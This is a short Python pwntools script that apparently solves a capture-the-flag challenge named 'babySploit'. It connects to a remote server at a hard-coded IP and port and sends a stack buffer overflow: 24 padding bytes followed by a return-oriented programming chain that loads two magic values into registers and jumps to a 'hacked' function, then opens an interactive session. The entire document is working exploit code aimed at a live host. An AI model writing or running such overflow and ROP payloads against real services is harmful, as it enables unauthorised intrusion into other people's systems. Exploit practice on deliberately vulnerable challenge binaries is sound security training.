from pwn import *

exe = ELF('./babySploit')
context.binary = exe

p = remote('78.40.108.21', 1338)
# p = gdb.debug('./babySploit', '''continue''')

pop_rdi = 0x401196
pop_rsi = 0x401198
hacked = exe.symbols['hacked']
p.sendline(b'A' * 24 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(pop_rsi) + p64(0xc0debabec0debabe) + p64(hacked))

p.interactive()